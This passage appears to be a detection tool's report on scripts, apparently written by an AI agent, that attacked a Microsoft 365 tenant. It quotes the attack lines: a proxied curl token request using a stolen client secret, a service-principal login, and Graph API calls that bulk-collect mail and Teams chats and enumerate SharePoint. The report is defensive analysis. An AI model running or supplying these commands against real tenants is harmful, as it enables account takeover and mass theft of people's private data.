      what     TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
               TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
      basis    TokenRequest
  [x] Data collected
      Mail, chat, documents or files were gathered in bulk. Treat their content as disclosed. Affected: alice@corp.example, bob@corp.example.
      targets  resource /sites; resource /sites/root/drives
      what     MailboxAccess: mail = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/messages?$top=500", headers=headers) (20261015_092000_step04_collect.py:8)
               TeamsMessageAccess: chat = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/mailFolders/TeamsMessagesData/messages", headers=headers) (20261015_092000_step04_collect.py:9)
               SharePointEnumeration: sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
               SharePointEnumeration: drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
      basis    MailboxAccess, TeamsMessageAccess, SharePointEnumeration
  [i] Commands generated by an AI agent
      The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
      basis    the premise of the tool
      files    20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_091000_step03_escalate.ps1 and 3 more
